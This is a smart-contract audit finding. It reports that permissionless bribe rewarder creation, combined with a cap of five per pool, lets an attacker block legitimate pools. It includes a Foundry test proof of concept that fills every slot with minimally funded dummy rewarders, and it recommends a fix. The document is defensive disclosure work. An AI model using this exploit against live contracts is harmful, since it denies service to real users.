# Bribe rewarder pool creation can be DoSed

## Summary
As the bribe rewarder pool creation is permissionless, and there is a cap to the number of bribe rewarders that can be created per pool (`MAX_BRIBES_PER_POOL = 5`), a malicious party can create rewarder pools with dummy tokens and large periods to DoS valid bribe rewarder pool creations.

## Vulnerability Detail
Anyone can create a `BribeRewarder` through the `RewardFactory` with any ERC20 token. Upon funding the bribe pool, it calls `Voter.onRegister()`, which caps the number of rewarders that can be added. Hence, it would be possible for anyone to create many dummy pools that are seeded with minimal liquidity for long voting periods to block valid bribe rewarder creations.

## POC
The setup can be found in the gist.

For brevity, the case is linked below.
```solidity
function test_DoS_bribe_creation() public {
  vm.startPrank(alice);
  for (uint i; i < 5; ++i) {
      bribeRewarder = BribeRewarder(payable(address(rewarderFactory.createBribeRewarder(IERC20(address(0)), address(tokenA)))));
      // 1000 periods, minimal wei amount per period
      bribeRewarder.fundAndBribe{value: 1000 wei}(1, 100, 1);
  }
  vm.startPrank(bob);
  bribeRewarder = BribeRewarder(payable(address(rewarderFactory.createBribeRewarder(IERC20(address(0)), address(tokenA)))));
  vm.expectRevert("too much bribes");
  bribeRewarder.fundAndBribe{value: 1000 wei}(1, 100, 1);
}
```

## Impact
Users desiring to create a valid bribe rewarder pool cannot do so.

Manual Review

## Recommendation
Consider whitelisting the type of tokens that can be used as bribes, and enforcing a minimum amount per voting period for each token.
